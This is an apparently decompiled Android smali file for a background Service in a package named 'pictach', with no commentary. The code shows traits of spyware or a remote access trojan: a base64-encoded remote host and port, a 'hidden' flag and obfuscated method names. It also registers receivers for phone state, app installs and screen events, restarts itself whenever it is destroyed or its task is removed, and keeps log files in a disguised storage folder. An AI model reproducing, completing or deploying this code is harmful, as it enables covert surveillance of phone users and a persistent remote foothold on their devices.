.class public Lcom/android/pictach/love;
.super Landroid/app/Service;
.source "sqixquxz.java"
# generated-77555
# validated-53134
# compiled-61545
# ep-tbkcorbxehyl


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/pictach/love$MyExceptionHandler;
    }
.end annotation


# static fields
.field public static Afterinstalloption:Ljava/lang/String;

.field public static FO_love_RSC:Z

.field public static F_love_ORCA:Z

.field public static Host:Ljava/lang/String;

.field public static Is_love_Hidden:Z

.field public static L_love_cl:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/android/pictach/DataHelper;",
            ">;"
        }
    .end annotation
.end field

.field public static L_love_i:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/android/pictach/Config;",
            ">;"
        }
    .end annotation
.end field

.field public static MyAccess:Lcom/android/pictach/Firebase;

.field public static Port:Ljava/lang/String;

.field public static allok:Z

.field public static app_love_Context:Landroid/content/Context;

.field public static br:Landroid/content/BroadcastReceiver;

.field public static c_love_mn:[Ljava/lang/String;

.field public static e_love_co:J

.field public static inx:I

.field public static k:Z

.field public static k_love_live:Z

.field public static p_love_lg:I

.field static st:Lcom/android/pictach/love;

.field public static yrfjerloveSERBRE:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 18

    const-string v0, "VHhUeFQ="

    .line 47
    invoke-static {v0}, Lcom/android/pictach/Utils;->affiliatedhpossessbimportedlresponsibilitymaquafhighlightedbdeletehcoloredjacademyedisplayedb40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/pictach/love;->yrfjerloveSERBRE:Ljava/lang/String;

    const-string v0, "K"

    .line 51
    sput-object v0, Lcom/android/pictach/love;->Afterinstalloption:Ljava/lang/String;

    const-string v0, "NjQuODkuMTYxLjE4OA"

    .line 55
    sput-object v0, Lcom/android/pictach/love;->Host:Ljava/lang/String;

    const-string v0, "Nzc3MQ"

    .line 58
    sput-object v0, Lcom/android/pictach/love;->Port:Ljava/lang/String;

    const-wide/16 v0, -0x1

    .line 63
    sput-wide v0, Lcom/android/pictach/love;->e_love_co:J

    const/4 v0, -0x1

    .line 64
    sput v0, Lcom/android/pictach/love;->p_love_lg:I

    .line 65
    sput v0, Lcom/android/pictach/love;->inx:I

    const-string v1, ""

    const-string v2, ""

    const-string v3, ""

    const-string v4, ""

    const-string v5, ""

    const-string v6, ""

    const-string v7, ""

    const-string v8, ""

    const-string v9, ""

    const-string v10, ""

    const-string v11, ""

    const-string v12, ""

    const-string v13, ""

    const-string v14, ""

    const-string v15, ""

    const-string v16, ""

    const-string v17, ""

    .line 66
    filled-new-array/range {v1 .. v17}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/4 v0, 0x0

    .line 67
    sput-boolean v0, Lcom/android/pictach/love;->k:Z

    .line 68
    sput-boolean v0, Lcom/android/pictach/love;->k_love_live:Z

    .line 69
    sput-boolean v0, Lcom/android/pictach/love;->F_love_ORCA:Z

    .line 70
    sput-boolean v0, Lcom/android/pictach/love;->FO_love_RSC:Z

    .line 71
    sput-boolean v0, Lcom/android/pictach/love;->Is_love_Hidden:Z

    const/4 v1, 0x0

    .line 138
    sput-object v1, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    .line 195
    sput-boolean v0, Lcom/android/pictach/love;->allok:Z

    .line 224
    sput-object v1, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 43
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static D_love_ele(Ljava/lang/String;)V
    .locals 7

    const-string v0, ".txt"

    const-string v1, "log-"

    const-string v2, "/Config/sys/apps/log"

    .line 149
    :try_start_0
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    .line 151
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 153
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 155
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto :goto_0

    .line 159
    :cond_0
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-direct {v4, v2, p0}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 160
    invoke-virtual {v4}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_0
    return-void
.end method

.method public static Get_love_Logs()Ljava/lang/String;
    .locals 5

    const-string v0, ""

    .line 172
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/Config/sys/apps/log"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 174
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 175
    invoke-virtual {v2}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    const/4 v2, 0x0

    move-object v3, v0

    .line 178
    :goto_0
    array-length v4, v1

    if-ge v2, v4, :cond_0

    .line 180
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v3, v1, v2

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "*"

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_0
    return-object v3

    :catch_0
    return-object v0
.end method

.method private RegNew(Landroid/content/IntentFilter;)Ljava/lang/Boolean;
    .locals 1

    if-eqz p1, :cond_0

    :try_start_0
    const-string v0, "android.intent.action.SCREEN_OFF"

    .line 322
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.USER_PRESENT"

    .line 323
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.ACTION_POWER_CONNECTED"

    .line 324
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.ACTION_POWER_DISCONNECTED"

    .line 325
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 326
    new-instance v0, Lcom/android/pictach/FirebaseApis;

    invoke-direct {v0}, Lcom/android/pictach/FirebaseApis;-><init>()V

    sput-object v0, Lcom/android/pictach/Utils;->rc:Landroid/content/BroadcastReceiver;

    .line 327
    sget-object v0, Lcom/android/pictach/Utils;->rc:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0, p1}, Lcom/android/pictach/love;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 p1, 0x1

    .line 328
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    :cond_0
    const/4 p1, 0x0

    .line 333
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 2

    .line 251
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 254
    :try_start_0
    sget-object v0, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    if-nez v0, :cond_0

    .line 256
    invoke-virtual {p0}, Lcom/android/pictach/love;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 266
    :catch_0
    :cond_0
    invoke-virtual {p0}, Lcom/android/pictach/love;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 268
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f090014

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/pictach/Utils;->p_Utils_r:Ljava/lang/String;

    .line 274
    :try_start_1
    sget-object v0, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-nez v0, :cond_1

    .line 280
    :try_start_2
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.PHONE_STATE"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 286
    new-instance v0, Lcom/android/pictach/RC;

    invoke-direct {v0}, Lcom/android/pictach/RC;-><init>()V

    sput-object v0, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;

    .line 287
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.intent.action.PACKAGE_ADDED"

    .line 288
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGE_REMOVED"

    .line 289
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGE_REPLACED"

    .line 292
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGE_CHANGED"

    .line 293
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGES_SUSPENDED"

    .line 294
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "package"

    .line 295
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    .line 296
    sget-object v1, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/android/pictach/love;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 302
    :catch_1
    :cond_1
    :try_start_3
    sget-object v0, Lcom/android/pictach/Utils;->rc:Landroid/content/BroadcastReceiver;

    if-nez v0, :cond_2

    .line 303
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.SCREEN_ON"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 304
    invoke-direct {p0, v0}, Lcom/android/pictach/love;->RegNew(Landroid/content/IntentFilter;)Ljava/lang/Boolean;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    :cond_2
    return-void
.end method

.method public onDestroy()V
    .locals 4

    .line 78
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 79
    sput v0, Lcom/android/pictach/Utils;->s_Utils_f0:I

    const/4 v0, 0x0

    .line 80
    sput-object v0, Lcom/android/pictach/love;->st:Lcom/android/pictach/love;

    .line 84
    :try_start_0
    sget-object v0, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    const-string v1, "Error"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, Lcom/android/pictach/Utils;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 91
    :catch_0
    :try_start_1
    sget-object v0, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;

    if-eqz v0, :cond_0

    .line 93
    sget-object v0, Lcom/android/pictach/love;->br:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/android/pictach/love;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 101
    :cond_0
    sget-object v0, Lcom/android/pictach/Utils;->rc:Landroid/content/BroadcastReceiver;

    if-eqz v0, :cond_1

    .line 102
    sget-object v0, Lcom/android/pictach/Utils;->rc:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/android/pictach/love;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 107
    :cond_1
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/pictach/love;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/android/pictach/Bodybuilding;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "RestartSensor"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/android/pictach/love;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 200
    :try_start_0
    sget-object p1, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    if-nez p1, :cond_0

    .line 202
    invoke-virtual {p0}, Lcom/android/pictach/love;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    .line 205
    :cond_0
    sget-object p1, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const p2, 0x7f090014

    invoke-virtual {p1, p2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Utils;->p_Utils_r:Ljava/lang/String;

    .line 206
    sget-boolean p1, Lcom/android/pictach/love;->allok:Z

    if-eqz p1, :cond_1

    .line 210
    const-class p1, Lcom/android/pictach/Api;

    sget-object p2, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    invoke-static {p1, p2}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 211
    sget-object p1, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    new-instance p2, Landroid/content/Intent;

    sget-object p3, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    const-class v0, Lcom/android/pictach/Api;

    invoke-direct {p2, p3, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    const/4 p1, 0x1

    return p1

    :catch_0
    const/4 p1, 0x2

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 3

    .line 120
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 123
    :try_start_0
    sget-object p1, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    const-string v0, "Error"

    const-wide/32 v1, 0x2bf20

    invoke-static {p1, v0, v1, v2}, Lcom/android/pictach/Utils;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 130
    :catch_0
    :try_start_1
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/pictach/love;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/android/pictach/Bodybuilding;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "RestartSensor"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/android/pictach/love;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method
